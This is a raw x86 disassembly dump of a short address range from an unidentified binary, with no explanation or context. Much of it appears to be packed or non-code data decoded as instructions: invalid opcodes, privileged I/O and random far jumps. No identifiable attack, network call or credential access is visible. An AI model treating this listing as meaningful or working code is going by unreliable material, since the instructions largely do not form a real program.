  41909f:	shr    DWORD PTR [ebx+0x71],0x65
  4190a3:	call   0x5e57:0x9b74626b
  4190aa:	arpl   bx,ax
  4190ac:	push   esi
  4190ad:	outs   dx,DWORD PTR ds:[esi]
  4190ae:	ins    BYTE PTR es:[edi],dx
  4190af:	mov    DWORD PTR [ecx],ecx
  4190b1:	ja     0x4190b3
  4190b3:	xchg   ecx,eax
  4190b4:	imul   esi,DWORD PTR [ecx+0x65],0x4a
  4190b8:	ins    BYTE PTR es:[edi],dx
  4190b9:	bound  esi,QWORD PTR [ebx+ebx*1+0x5f]
  4190bd:	bound  esp,QWORD PTR [ecx+0x64]
  4190c0:	jo     0x419114
  4190c2:	jb     0x4190c4
  4190c4:	ins    BYTE PTR es:[edi],dx
  4190c5:	dec    esp
  4190c6:	std    
  4190c7:	inc    DWORD PTR [edi]
  4190c9:	test   BYTE PTR [ebx+0x69],ch
  4190cc:	(bad)  
  4190cd:	outs   dx,DWORD PTR ds:[esi]
  4190ce:	jno    0x4190fe
  4190d0:	hlt    
  4190d1:	push   0xc8d0069
  4190d6:	dec    edi
  4190d7:	je     0x419123
  4190d9:	ds jno 0x41914e
  4190dc:	inc    ecx
  4190dd:	dec    esp
  4190de:	std    
  4190df:	dec    DWORD PTR [eax+0x31744f0c]
  4190e5:	add    dl,dh
  4190e7:	inc    eax
  4190e8:	fld    DWORD PTR [ecx]
  4190ea:	mov    ebx,0x444313e
  4190ef:	push   ecx
  4190f0:	in     eax,0x21
  4190f2:	aad    0x6c
  4190f4:	call   0x31804906
  4190f9:	inc    esp
  4190fa:	add    al,0x51
  4190fc:	mov    ebp,0xc373d641
  419101:	jo     0x419104
  419103:	jmp    0x6572:0x71b56331
  41910a:	mov    cl,0x4d
  41910c:	js     0x41917f
  41910e:	add    DWORD PTR [esi],ecx
  419110:	xor    BYTE PTR [edi-0x4b],bh
  419113:	jno    0x419097
  419115:	data16 mov bl,0x46
  419118:	data16 xor al,BYTE PTR [ecx]
  41911b:	jno    0x4190b6
  41911d:	jle    0x4190d9
  41911f:	pop    esi
  419120:	cmp    DWORD PTR [ecx-0x21],0x18e8563
  419127:	add    BYTE PTR ss:[ecx],dh
  41912a:	mov    DWORD PTR [edi-0x5b94a29e],ebx
  419130:	arpl   WORD PTR [ebp-0x60],dx
  419133:	add    BYTE PTR [edx],ch
  419135:	xor    DWORD PTR [ebx-0x5ca68c58],edx
  41913b:	mov    ch,0x73
  41913d:	push   ebx
  41913e:	test   eax,0xcd4c5ea1
  419143:	add    eax,DWORD PTR [edi+0x31]
  419146:	mov    edi,0xcd1a60a0
  41914b:	mov    bh,0xff
  41914d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41914e:	adc    eax,DWORD PTR [ecx+eiz*2]
  419151:	push   cs
  419152:	aam    0xa1
  419154:	bound  edx,QWORD PTR [edx]
  419156:	out    0x3,al
  419158:	es xor edi,ecx
  41915b:	lahf   
  41915c:	ins    BYTE PTR es:[edi],dx
  41915d:	add    cl,BYTE PTR [ecx]
  41915f:	or     al,0xb7
  419161:	or     eax,0x2a911a8
  419166:	or     DWORD PTR [ebx],ebp
  419168:	add    al,0xe0
  41916a:	lods   eax,DWORD PTR ds:[esi]
  41916b:	cld    
  41916c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41916d:	data16 and al,0x2a
  419170:	add    al,0xe0
  419172:	lods   eax,DWORD PTR ds:[esi]
  419173:	or     ch,BYTE PTR [ecx+0x3e69cd1]
  419179:	wbinvd 
  41917b:	stc    
  41917c:	test   al,0xd1
  41917e:	call   0xa8da:0x8f403e6
  419185:	ret    0xc597
  419188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419189:	cdq    
  41918a:	mov    ah,0xd6
  41918c:	mov    bh,0x0
  41918e:	es and al,0x8
  419191:	add    al,0x84
  419193:	mov    eax,0xaaa2d6a7
  419198:	mov    eax,0xe69983b7
  41919d:	add    edi,DWORD PTR [eax+ebx*4-0x6b]
  4191a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191a2:	mov    eax,ebx
  4191a4:	fsub   st,st(1)
  4191a6:	xchg   edx,eax
  4191a7:	mov    ch,0x82
  4191a9:	add    edi,DWORD PTR [edx+0x9]
  4191ac:	fwait
  4191ad:	mov    ds:0xb69bad87,al
  4191b2:	push   ebx
  4191b3:	xchg   edi,eax
  4191b4:	xchg   esi,eax
  4191b5:	mov    ch,0x45
  4191b7:	stos   DWORD PTR es:[edi],eax
  4191b8:	jg     0x419159
  4191ba:	push   ebx
  4191bb:	retf   0x3e6
  4191be:	or     WORD PTR [edx+eiz*4],di
  4191c2:	dec    edx
  4191c3:	mov    ah,0x47
  4191c5:	test   al,0x63
  4191c7:	cwde   
  4191c8:	dec    ebx
  4191c9:	mov    dh,0xfe
  4191cb:	xchg   esi,eax
  4191cc:	cmp    eax,0x4bb50faa
  4191d1:	add    al,0x22
  4191d3:	cwde   
  4191d4:	inc    ebx
  4191d5:	mov    dh,0x13
  4191d7:	mov    bl,0xff
  4191d9:	ds xchg ebx,eax
  4191db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191dc:	imul   edi,DWORD PTR ds:0xe900092d,0x32
  4191e3:	or     DWORD PTR [eax],eax
  4191e5:	jmp    0xe9419b1c
  4191ea:	xor    cl,BYTE PTR [ecx]
  4191ec:	add    cl,ch
  4191ee:	xor    cl,BYTE PTR [ecx]
  4191f0:	add    cl,ch
  4191f2:	add    BYTE PTR [edx],dh
  4191f4:	or     DWORD PTR [eax],eax
  4191f6:	jmp    0xe9419b2d
  4191fb:	xor    cl,BYTE PTR [ecx]
  4191fd:	add    cl,ch
  4191ff:	xor    cl,BYTE PTR [ecx]
  419201:	add    cl,ch
  419203:	xor    cl,BYTE PTR [ecx]
  419205:	add    cl,ch
  419207:	xor    cl,BYTE PTR [ecx]
  419209:	add    cl,ch
  41920b:	xor    cl,BYTE PTR [ecx]
  41920d:	add    cl,ch
  41920f:	xor    cl,BYTE PTR [ecx]
  419211:	add    cl,ch
  419213:	xor    cl,BYTE PTR [ecx]
  419215:	add    cl,ch
  419217:	xor    cl,BYTE PTR [ecx]
  419219:	add    cl,ch
  41921b:	xor    cl,BYTE PTR [ecx]
  41921d:	add    cl,ch
  41921f:	xor    cl,BYTE PTR [ecx]
  419221:	add    cl,ch
  419223:	xor    cl,BYTE PTR [ecx]
  419225:	add    cl,ch
  419227:	xor    cl,BYTE PTR [ecx]
  419229:	add    cl,ch
  41922b:	xor    cl,BYTE PTR [ecx]
  41922d:	add    cl,ch
  41922f:	xor    cl,BYTE PTR [ecx]
  419231:	add    cl,ch
  419233:	xor    cl,BYTE PTR [ecx]
  419235:	add    cl,ch
  419237:	xor    cl,BYTE PTR [ecx]
  419239:	add    cl,ch
  41923b:	xor    cl,BYTE PTR [ecx]
  41923d:	add    cl,ch
  41923f:	xor    cl,BYTE PTR [ecx]
  419241:	add    cl,ch
  419243:	xor    cl,BYTE PTR [ecx]
  419245:	add    cl,ch
  419247:	xor    cl,BYTE PTR [ecx]
  419249:	add    cl,ch
  41924b:	xor    cl,BYTE PTR [ecx]
  41924d:	add    cl,ch
  41924f:	xor    cl,BYTE PTR [ecx]
  419251:	add    BYTE PTR [eax],al
  419253:	mov    BYTE PTR [esi],al
  419255:	add    BYTE PTR [eax],al
  419257:	add    BYTE PTR [eax-0x67fffffa],cl
  41925d:	push   es
  41925e:	add    BYTE PTR [eax],al
  419260:	cwde   
  419261:	push   es
  419262:	add    BYTE PTR [eax],al
  419264:	mov    BYTE PTR [esi],al
  419266:	add    BYTE PTR [eax],al
  419268:	mov    BYTE PTR [esi],al
  41926a:	add    BYTE PTR [eax],al
  41926c:	pop    eax
  41926d:	push   es
  41926e:	add    BYTE PTR [eax],al
  419270:	pop    eax
  419271:	push   es
  419272:	add    BYTE PTR [eax],al
  419274:	dec    eax
  419275:	push   es
  419276:	add    BYTE PTR [eax],al
  419278:	dec    eax
  419279:	push   es
  41927a:	add    BYTE PTR [eax],al
  41927c:	pop    eax
  41927d:	push   es
  41927e:	add    BYTE PTR [eax],al
  419280:	pop    eax
  419281:	push   es
  419282:	add    BYTE PTR [eax],al
  419284:	dec    eax
  419285:	push   es
  419286:	add    BYTE PTR [eax],al
  419288:	dec    eax
  419289:	push   es
  41928a:	add    BYTE PTR [eax],al
  41928c:	sbb    BYTE PTR [esi],al
  41928e:	add    BYTE PTR [eax],al
  419290:	sbb    BYTE PTR [esi],al
  419292:	add    BYTE PTR [eax],al
  419294:	or     BYTE PTR [esi],al
  419296:	add    BYTE PTR [eax],al
  419298:	or     BYTE PTR [esi],al
  41929a:	add    BYTE PTR [eax],al
  41929c:	sbb    BYTE PTR [esi],al
  41929e:	add    BYTE PTR [eax],al
  4192a0:	sbb    BYTE PTR [esi],al
  4192a2:	add    BYTE PTR [eax],al
  4192a4:	or     BYTE PTR [esi],al
  4192a6:	add    BYTE PTR [eax],al
  4192a8:	or     BYTE PTR [esi],al
  4192aa:	add    BYTE PTR [eax],al
  4192ac:	test   BYTE PTR [esi-0x3445ae14],cl
  4192b2:	pop    es
  4192b3:	mov    ch,BYTE PTR [ecx]
  4192b5:	xchg   ecx,eax
  4192b6:	dec    ebx
  4192b7:	jmp    FWORD PTR [edx+0xc35b2b]
  4192bd:	fs mov gs,esp
  4192c0:	push   ecx
  4192c1:	pop    edi
  4192c2:	mov    edx,0x8e55c930
  4192c7:	outs   dx,DWORD PTR ds:[esi]
  4192c8:	xor    BYTE PTR [edx+0x278b0b9a],ch
  4192ce:	add    eax,0x90394689
  4192d3:	inc    ebx
  4192d4:	cld    
  4192d5:	stos   BYTE PTR es:[edi],al
  4192d6:	mov    ds:0x895f8b1f,al
  4192db:	cmp    eax,0x800a056b
  4192e0:	aas    
  4192e1:	cli    
  4192e2:	pushf  
  4192e3:	add    ebx,ebp
  4192e5:	mov    cl,al
  4192e7:	pop    ebp
  4192e8:	mov    ecx,DWORD PTR [ebx+eax*8-0x71fb3340]
  4192ef:	in     al,dx
  4192f0:	adc    DWORD PTR [ebp-0x14],0xffffff88
  4192f4:	inc    ebp
  4192f5:	sub    DWORD PTR [eax-0x2c551fbd],edx
  4192fb:	fisttp WORD PTR [ebx+0x510128e4]
  419301:	add    eax,0xaae45390
  419306:	retf   
  419307:	jecxz  0x419294
  419309:	jmp    0x398e93ae
  41930e:	xchg   edx,eax
  41930f:	dec    ebx
  419310:	clc    
  419311:	mov    edx,0x738bf7b6
  419316:	in     eax,0x0
  419318:	inc    ebp
  419319:	sub    DWORD PTR [edx-0x314517bd],edx
  41931f:	test   DWORD PTR [ebx+0xe96000],0x53922955
  419329:	lock stos BYTE PTR es:[edi],al
  41932b:	(bad)  
  41932c:	test   DWORD PTR [ebx+0x4d00fd79],0xfc4b9239
  419336:	test   dh,0xf3
  419339:	add    BYTE PTR [ecx],dh
  41933b:	or     DWORD PTR [eax],eax
  41933d:	jmp    0x419377
  41933f:	xchg   esp,eax
  419340:	push   ebx
  419341:	hlt    
  419342:	mov    dl,0x4b
  419344:	dec    DWORD PTR [eax+0x45891564]
  41934a:	mov    ecx,0x6af44b94
  41934f:	rcl    DWORD PTR [edi],1
  419351:	jae    0x41934c
  419353:	xchg   ebx,eax
  419354:	push   ebx
  419355:	lock stos BYTE PTR es:[edi],al
  419357:	or     eax,DWORD PTR [ecx]
  419359:	inc    ebp
  41935a:	sub    DWORD PTR [edx+0xf1bdc43],edx
  419360:	push   0xffc933ac
  419365:	mov    ch,ah
  419367:	cmp    al,0x4f
  419369:	call   0x419d4f
  41936e:	mov    dl,0x45
  419370:	or     al,0x85
  419372:	jno    0x41930a
  419374:	sbb    BYTE PTR [ebx+0x45891504],cl
  41937a:	dec    ecx
  41937b:	adc    BYTE PTR [ebp+0x4b91e10c],dh
  419381:	in     al,dx
  419382:	mov    edx,0x8bebb6
  419387:	hlt    
  419388:	sbb    al,0x89
  41938a:	add    al,0xa1
  41938c:	or     al,0x43
  41938e:	or     BYTE PTR [edx],bl
  419390:	push   cs
  419391:	mov    DWORD PTR [ebp+0x21],ecx
  419394:	mov    WORD PTR [edi-0x103257fc],?
  41939a:	jmp    0x419369
  41939c:	fstp   TBYTE PTR [edi-0x3f41eb75]
  4193a2:	int3   
  4193a3:	cmc    
  4193a4:	dec    esp
  4193a5:	int3   
  4193a6:	int3   
  4193a7:	in     eax,dx
  4193a8:	dec    esp
  4193a9:	int3   
  4193aa:	int3   
  4193ab:	in     eax,0x4c
  4193ad:	int3   
  4193ae:	int3   
  4193af:	test   BYTE PTR [esp+ebp*8-0x17ff2a7d],dl
  4193b6:	add    eax,0x89fd1fde
  4193bb:	ins    BYTE PTR es:[edi],dx
  4193bc:	xor    DWORD PTR [ecx-0x184726bb],ecx
  4193c2:	sub    esi,eax
  4193c4:	pop    ds
  4193c5:	std    
  4193c6:	xor    ebp,0x4
  4193c9:	mov    eax,ds:0xffca3ef4
  4193ce:	addr16 in eax,dx
  4193d0:	or     al,BYTE PTR [eax+0x0]
  4193d3:	mov    edx,0x9e51e7cd
  4193d8:	cmc    
  4193d9:	repz ja 0x4193cc
  4193dc:	or     BYTE PTR [ecx-0x35f908],ah
  4193e2:	imul   esi,DWORD PTR [ecx],0x6d67ffb3
  4193e8:	or     al,BYTE PTR [eax+0x0]
  4193eb:	add    BYTE PTR [esi-0xb],dh
  4193ee:	div    DWORD PTR [edi-0x10]
  4193f1:	or     BYTE PTR [edi+0x43475945],al
  4193f7:	cld    
  4193f8:	xor    DWORD PTR [ecx],ecx
  4193fa:	add    BYTE PTR [eax],al
  4193fc:	dec    edx
  4193fd:	adc    DWORD PTR [ecx-0x3d74b2ab],ecx
  419403:	add    DWORD PTR [eax-0x437c044b],edi
  419409:	sbb    al,0x8
  41940b:	jae    0x41941d
  41940d:	xchg   esp,eax
  41940e:	inc    ebx
  41940f:	cld    
  419410:	mov    edx,0x338c830d
  419415:	leave  
  419416:	call   DWORD PTR [eax-0x56]
  419419:	mov    ah,0xe7
  41941b:	push   edx
  41941c:	push   ss
  41941d:	cmc    
  41941e:	repz ja 0x419491
  419421:	or     DWORD PTR [ecx+0x491054d],ecx
  419427:	lea    eax,ds:0xa003e97
  41942d:	cmp    cl,BYTE PTR [ecx-0x33b5731b]
  419433:	int3   
  419434:	cmc    
  419435:	dec    ebp
  419436:	int3   
  419437:	int3   
  419438:	in     eax,dx
  419439:	dec    ebp
  41943a:	int3   
  41943b:	int3   
  41943c:	in     eax,0x4d
  41943e:	int3   
  41943f:	int3   
  419440:	fs xchg edx,eax
  419442:	in     al,dx
  419443:	mov    eax,ds:0x3ea161
  419448:	call   DWORD PTR [ecx-0x3355cfc0]
  41944e:	pop    es
  41944f:	add    BYTE PTR ds:[eax+0x725d07d1],bh
  419456:	dec    ebp
  419457:	int3   
  419458:	int3   
  419459:	ins    DWORD PTR es:[edi],dx
  41945a:	dec    ebp
  41945b:	int3   
  41945c:	int3   
  41945d:	gs dec ebp
  41945f:	int3   
  419460:	int3   
  419461:	in     al,0x91
  419463:	in     al,dx
  419464:	mov    ebp,esp
  419466:	or     al,0x50
  419468:	mov    ebp,esp
  41946a:	adc    BYTE PTR [edi-0x1],cl
  41946d:	sbb    al,0x15
  41946f:	jne    0x4194b2
  419471:	xor    DWORD PTR [eax+eax*8-0x33b28a34],edi
  419478:	int3   
  419479:	ins    DWORD PTR es:[edi],dx
  41947a:	dec    ebp
  41947b:	int3   
  41947c:	int3   
  41947d:	gs dec ebp
  41947f:	int3   
  419480:	int3   
  419481:	in     al,0x91
  419483:	in     al,dx
  419484:	adc    DWORD PTR [ebp+0x11],0x6a
  419488:	add    bl,cl
  41948a:	or     BYTE PTR [eax-0x24],ch
  41948d:	xor    ecx,ecx
  41948f:	(bad)  
  419490:	inc    BYTE PTR [ecx+eiz*1+0x75]
  419494:	inc    ecx
  419495:	xor    DWORD PTR [eax+0x3189f843],edx
  41949b:	add    al,BYTE PTR [eax+0x31]
  41949e:	xchg   edx,eax
  41949f:	inc    ebx
  4194a0:	clc    
  4194a1:	popa   
  4194a2:	xor    DWORD PTR [edx-0x7ee1f901],edi
  4194a8:	les    ebp,FWORD PTR [ecx]
  4194aa:	nop
  4194ab:	inc    ebx
  4194ac:	cld    
  4194ad:	stos   BYTE PTR es:[edi],al
  4194ae:	retf   
  4194af:	sqrtps xmm7,XMMWORD PTR [edx+0x520bb3]
  4194b6:	mov    edx,0xde5007c3
  4194bb:	mov    bl,0xfb
  4194bd:	mov    ecx,esp
  4194bf:	mov    ebx,0x9264ccc0
  4194c4:	in     al,dx
  4194c5:	push   ecx
  4194c6:	out    dx,al
  4194c7:	ret    
  4194c8:	sti    
  4194c9:	add    BYTE PTR [ecx],dh
  4194cb:	or     DWORD PTR [eax],eax
  4194cd:	jmp    0x4194f7
  4194cf:	xchg   edx,eax
  4194d0:	inc    ebx
  4194d1:	cld    
  4194d2:	mov    dl,0x48
  4194d4:	dec    DWORD PTR [eax+0x4d891cec]
  4194da:	popf   
  4194db:	loope  0x419527
  4194dd:	adc    BYTE PTR [edx],ah
  4194df:	dec    BYTE PTR [eax+0x530a3955]
  4194e5:	cld    
  4194e6:	ss push edi
  4194e8:	add    cl,BYTE PTR [ebx+0x4d010cec]
  4194ee:	jne    0x4194fd
  4194f0:	mov    dh,0x11
  4194f2:	sub    cl,BYTE PTR [ebx+0x74]
  4194f5:	pop    es
  4194f6:	test   eax,0x31000007
  4194fb:	xor    al,BYTE PTR [ebx+ebp*8]
  4194fe:	sbb    ecx,0xbb548bbf
  419504:	ror    ah,0x75
  419507:	dec    esp
  419508:	int3   
  419509:	int3   
  41950a:	ins    DWORD PTR es:[edi],dx
  41950b:	dec    esp
  41950c:	int3   
  41950d:	int3   
  41950e:	gs dec esp
  419510:	int3   
  419511:	int3   
  419512:	test   BYTE PTR [eax+0x949b9ec],dl
  419518:	add    BYTE PTR [eax],al
  41951a:	add    BYTE PTR [ebp+0x24890790],dl
  419520:	mov    ecx,0xbe314177
  419525:	ror    ah,0xf5
  419528:	dec    ebp
  419529:	int3   
  41952a:	int3   
  41952b:	in     eax,dx
  41952c:	dec    ebp
  41952d:	int3   
  41952e:	int3   
  41952f:	in     eax,0x4d
  419531:	int3   
  419532:	int3   
  419533:	test   BYTE PTR [eax-0x62a7c14],dl
  419539:	mov    BYTE PTR [ebp+0x29],al
  41953c:	mov    BYTE PTR [eax+0x4],bh
  41953f:	xor    DWORD PTR [esp+eax*4],ecx
  419542:	mov    BYTE PTR [ecx],dh
  419544:	or     DWORD PTR [eax],eax
  419546:	mov    esi,DWORD PTR [ecx+edx*1-0x77]
  41954a:	push   ecx
  41954b:	xor    eax,0xe008ea88
  419550:	das    
  419551:	xchg   DWORD PTR [ebp-0x5b],edx
  419554:	nop
  419555:	inc    ebx
  419556:	or     BYTE PTR [edx-0xb76f7b7],dh
  41955c:	sbb    ch,al
  41955e:	inc    ebp
  41955f:	xchg   ebp,eax
  419560:	or     DWORD PTR [eax],eax
  419562:	add    BYTE PTR [ecx],dh
  419564:	xor    BYTE PTR [edi],al
  419566:	mov    esi,esp
  419568:	sbb    al,0x81
  41956a:	shl    DWORD PTR [eax],0x92
  41956d:	dec    ebx
  41956e:	cld    
  41956f:	stos   BYTE PTR es:[edi],al
  419570:	mov    dh,0xfb
  419572:	cmp    eax,DWORD PTR [edx*1-0x3945b98f]
  419579:	sti    
  41957a:	mov    ebp,esp
  41957c:	sbb    BYTE PTR ds:0xca3d00b7,cl
  419582:	mov    esi,0xfa883dfa
  419587:	add    edi,DWORD PTR [esi+edx*8-0x6fc2ba78]
  41958e:	dec    ebx
  41958f:	lock es push esp
  419592:	adc    al,0x41
  419594:	mov    al,0x26
  419596:	std    
  419597:	rdtsc  
  419599:	or     DWORD PTR [edi+0x43901955],eax
  41959f:	or     BYTE PTR [edx+0x39030bcd],ch
  4195a5:	nop
  4195a6:	push   ebx
  4195a7:	clc    
  4195a8:	mov    edx,0x74030f04
  4195ad:	stc    
  4195ae:	mov    BYTE PTR [ebp+0x29],cl
  4195b1:	nop
  4195b2:	push   ebx
  4195b3:	or     al,0x32
  4195b5:	cli    
  4195b6:	mov    BYTE PTR [ebp-0x17],cl
  4195b9:	xchg   ecx,eax
  4195ba:	add    al,0xa
  4195bc:	retf   0x8971
  4195bf:	push   ebp
  4195c0:	sub    DWORD PTR [eax-0x38cdf7bd],edx
  4195c6:	add    ecx,DWORD PTR [ecx+0x6be7116c]
  4195cc:	mov    esi,0xcc8bfd1b
  4195d1:	mov    ebp,0x9004ccc0
  4195d6:	in     al,dx
  4195d7:	adc    DWORD PTR [ebp+0x294588e4],0xffffff92
  4195de:	inc    ebx
  4195df:	in     al,0xaa
  4195e1:	int    0xe3
  4195e3:	mov    eax,DWORD PTR [eax]
  4195e5:	in     al,0x24
  4195e7:	add    DWORD PTR [ecx+0x45],edx
  4195ea:	xchg   edx,eax
  4195eb:	push   ebx
  4195ec:	call   0x8c295b9b
  4195f1:	test   eax,0x31000088
  4195f6:	xchg   edx,eax
  4195f7:	dec    ebx
  4195f8:	lock mov dl,0x9d
  4195fb:	out    dx,eax
  4195fc:	add    BYTE PTR [esi],ch
  4195fe:	test   ecx,edi
  419600:	add    BYTE PTR [ecx],dh
  419602:	or     DWORD PTR [ecx+0x53083955],ecx
  419608:	lock mov eax,0xf48bdfb5
  41960e:	sub    BYTE PTR [ecx+0xd092178],al
  419614:	test   BYTE PTR [edx+ecx*1],dl
  419617:	add    BYTE PTR [eax],al
  419619:	fwait
  41961a:	or     DWORD PTR [edx+0x0],ebp
  41961d:	stos   BYTE PTR es:[edi],al
  41961e:	int3   
  41961f:	fisttp WORD PTR [ebx+0x5101117c]
  419625:	cmp    eax,0x915fcb7
  41962a:	xchg   ebx,eax
  41962b:	add    BYTE PTR ds:[eax+0x6c8bfbc4],ch
  419632:	sub    DWORD PTR [ecx+0x16953138],eax
  419638:	mov    esi,DWORD PTR [ecx+ebp*1-0x77]
  41963c:	push   ebp
  41963d:	sub    DWORD PTR [esi],eax
  41963f:	jns    0x45cac3c1
  419645:	ror    DWORD PTR [esi+0x3200084b],1
  41964b:	ror    DWORD PTR [edi],1
  41964d:	mov    DWORD PTR [ebp+edx*1-0x17],ebp
  419651:	pop    ss
  419652:	stos   BYTE PTR es:[edi],al
  419653:	mov    ah,0xdf
  419655:	mov    esi,esp
  419657:	adc    BYTE PTR [ecx],al
  419659:	inc    edx
  41965a:	inc    ecx
  41965b:	nop
  41965c:	inc    ebx
  41965d:	hlt    
  41965e:	stos   BYTE PTR es:[edi],al
  41965f:	int3   
  419660:	fisttp WORD PTR [ebx+0x110110fc]
  419666:	mov    eax,0xecc7ebb4
  41966b:	and    BYTE PTR [eax],al
  41966d:	add    BYTE PTR [ecx],dh
  41966f:	or     DWORD PTR [ecx+0x78869145],ecx
  419675:	adc    BYTE PTR [ecx],dh
  419677:	xchg   ebp,eax
  419678:	or     al,0x8b
  41967a:	hlt    
  41967b:	sub    BYTE PTR [ecx+0x4953139],al
  419681:	(bad)  
  419682:	in     al,dx
  419683:	and    bh,bh
  419685:	push   DWORD PTR [ecx]
  419687:	or     DWORD PTR [ecx+0x3a863d55],ecx
  41968d:	add    ch,al
  41968f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419690:	mov    BYTE PTR [ebp+0x3d],al
  419693:	mov    cs,WORD PTR [eax]
  419695:	adc    DWORD PTR [eax],0xb1000009
  41969b:	xchg   esp,eax
  41969c:	sbb    ecx,DWORD PTR [ebx+0x2891584]
  4196a2:	dec    esp
  4196a3:	sbb    bh,ch
  4196a5:	dec    DWORD PTR [esi+0x54d88b9]
  4196ab:	mov    eax,0xfc00b5e7
  4196b0:	sbb    ebp,edi
  4196b2:	sub    ebp,0x10
  4196b5:	xchg   DWORD PTR [ebp+0xd],eax
  4196b8:	cs sbb al,0x8b
  4196bb:	jl     0x4196d2
  4196bd:	mov    DWORD PTR [edx],eax
  4196bf:	stos   BYTE PTR es:[edi],al
  4196c0:	retf   
  4196c1:	pop    es
  4196c2:	lea    edi,[ebp+0x11]
  4196c5:	add    dl,BYTE PTR [edx-0x46]
  4196c8:	ret    
  4196c9:	sti    
  4196ca:	push   eax
  4196cb:	fnstenv [ecx-0x5]
  4196ce:	(bad)  
  4196cf:	mov    esi,0xa808c485
  4196d4:	ret    
  4196d5:	fisttp DWORD PTR [ebx+0x558914fc]
  4196db:	test   DWORD PTR [edi+0x14f48b0f],ecx
  4196e1:	add    eax,0xf443902d
  4196e7:	mov    edx,0x7083ebcb
  4196ec:	add    al,0x87
  4196ee:	dec    ebp
  4196ef:	lea    ebp,ds:0x28dc8b95
  4196f5:	add    edx,0xe0539045
  4196fb:	pop    eax
  4196fc:	or     bh,ch
  4196fe:	call   FWORD PTR [esi-0x73]
  419701:	jecxz  0x419760
  419703:	jb     0x419751
  419705:	int3   
  419706:	int3   
  419707:	in     al,0x8d
  419709:	in     al,dx
  41970a:	adc    DWORD PTR [ebp+0x10],0x68
  41970e:	lock xor ecx,ecx
  419711:	(bad)  
  419712:	inc    BYTE PTR [eax]
  419714:	sbb    al,0x9
  419716:	js     0x419759
  419718:	xor    DWORD PTR [edx+0x1599f843],eax
  41971e:	add    al,BYTE PTR [eax+0x31]
  419721:	test   BYTE PTR [ebx-0x8],al
  419724:	and    DWORD PTR [ecx],0x190efd3e
  41972a:	add    esp,0xfc438239
  419730:	stos   BYTE PTR es:[edi],al
  419731:	(bad)  
  419732:	sqrtps xmm5,XMMWORD PTR [edx-0x45adf442]
  419739:	into   
  41973a:	pop    es
  41973b:	push   eax
  41973c:	out    0xbe,al
  41973e:	sti    
  41973f:	mov    edx,esp
  419741:	mov    dh,0xc0
  419743:	int3   
  419744:	in     eax,0x45
  419746:	int3   
  419747:	int3   
  419748:	fs test ah,ch
  41974b:	mov    eax,ds:0x3e9165
  419750:	test   DWORD PTR [ecx],0xbd1c8b68
  419756:	ja     0x419799
  419758:	xor    DWORD PTR [edx+0x4ce30150],eax
  41975e:	mov    BYTE PTR [eax+0x34],dl
  419761:	mov    dh,0xc0
  419763:	int3   
  419764:	gs inc ebp
  419766:	int3   
  419767:	int3   
  419768:	in     al,0x83
  41976a:	in     al,dx
  41976b:	adc    DWORD PTR [ebp-0x6af60fb],0xffffffc9
  419772:	dec    DWORD PTR [edx+0x3ec6dc63]
  419778:	add    BYTE PTR [edx-0x7c74d037],bh
  41977e:	test   dl,dl
  419780:	ds stos BYTE PTR es:[edi],al
  419782:	ror    DWORD PTR [ebx],0x8b
  419785:	add    DWORD PTR [edx-0x31450bb5],0xfffffff3
  41978c:	mov    edi,ecx
  41978e:	add    al,0x87
  419790:	dec    ebp
  419791:	cmp    DWORD PTR [ebx+edx*2-0x4415708],eax
  419798:	mov    eax,0x930
  41979d:	lods   al,BYTE PTR ds:[esi]
  41979e:	dec    eax
  41979f:	je     0x4197e5
  4197a1:	mov    dl,0x95
  4197a3:	test   DWORD PTR [eax],0xc0310d9c
  4197a9:	sbb    dl,ch
  4197ab:	mov    BYTE PTR [ebp+0x9],cl
  4197ae:	test   BYTE PTR [edi+0x18],cl
  4197b1:	cmp    bh,BYTE PTR [esi-0x7be78af9]
  4197b7:	inc    ebx
  4197b8:	clc    
  4197b9:	mov    edx,0x79890bc5
  4197be:	cmc    
  4197bf:	mov    BYTE PTR [ebp-0x27],dl
  4197c2:	add    DWORD PTR [ebx+0x10],0xffffffa8
  4197c6:	retf   0xb817
  4197c9:	xor    BYTE PTR [ecx],cl
  4197cb:	add    BYTE PTR [eax],al
  4197cd:	(bad)  
  4197cf:	mov    BYTE PTR [ebp-0x47],cl
  4197d2:	or     DWORD PTR [edi],0xffffff89
  4197d5:	pop    esp
  4197d6:	adc    DWORD PTR [ecx+0x42d3a945],ecx
  4197dc:	cld    
  4197dd:	add    BYTE PTR [ecx*1+0xc8ac031],bl
  4197e4:	jmp    0x898afa9c
  4197e9:	in     eax,0xec
  4197eb:	dec    ebx
  4197ec:	int3   
  4197ed:	int3   
  4197ee:	jne    0x419834
  4197f0:	int3   
  4197f1:	int3   
  4197f2:	ins    DWORD PTR es:[edi],dx
  4197f3:	inc    esp
  4197f4:	int3   
  4197f5:	int3   
  4197f6:	gs inc esp
  4197f8:	int3   
  4197f9:	int3   
  4197fa:	add    al,0x84
  4197fc:	in     al,dx
  4197fd:	adc    DWORD PTR [ebp-0x10],0xffffffc4
  419801:	inc    ebp
  419802:	pop    ecx
  419803:	or     BYTE PTR [eax],dh
  419805:	add    BYTE PTR [ecx],dh
  419807:	mov    eax,ds:0x8f10303
  41980c:	lahf   
  41980d:	cmp    al,0xc9
  41980f:	leave  
  419810:	dec    DWORD PTR [edi+0x49]
  419813:	mov    ebx,0x8b36fffb
  419818:	les    ecx,FWORD PTR [eax]
  41981a:	mov    eax,0x716af3cc
  41981f:	or     BYTE PTR [ebx-0x8],0x80
  419823:	adc    BYTE PTR [ebx],0x1c
  419826:	cdq    
  419827:	enter  0x8aff,0x73
  41982b:	mov    ecx,0x16316a4f
  419830:	push   ebx
  419831:	hlt    
  419832:	sar    ch,cl
  419834:	ja     0x419877
  419836:	xor    DWORD PTR [edx-0x3796ebc5],ecx
  41983c:	(bad)  
  41983d:	call   FWORD PTR [esi+ecx*1-0x48]
  419841:	add    al,BYTE PTR [eax]
  419843:	xor    DWORD PTR [ecx],ecx
  419845:	add    bl,ch
  419847:	dec    ebx
  419848:	or     BYTE PTR [ebx],0x0
  41984b:	xor    ecx,ecx
  41984d:	dec    DWORD PTR [eax+0x681974]
  419853:	inc    esi
  419854:	or     BYTE PTR [eax],al
  419856:	push   0x400b31
  41985b:	mov    edx,0xf07813fc
  419860:	or     BYTE PTR [edi-0x3e],bh
